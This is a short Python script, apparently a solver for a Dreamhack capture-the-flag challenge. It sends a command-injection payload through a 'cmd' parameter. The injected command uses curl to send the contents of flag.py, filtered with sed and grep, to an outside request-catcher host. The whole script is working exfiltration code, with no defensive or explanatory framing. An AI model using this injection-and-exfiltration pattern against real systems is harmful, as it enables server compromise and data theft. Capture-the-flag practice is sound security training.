import requests
url=f"http://host3.dreamhack.games:12409?cmd=curl https://qjyfxze.request.dreamhack.games?flag=$(sed 's/ /:/g' flag.py | grep 'DH')"
#
data={
    "cmd":"ls"
    }
#options,get,head
response=requests.head(url)
print(url)
print(response.headers)
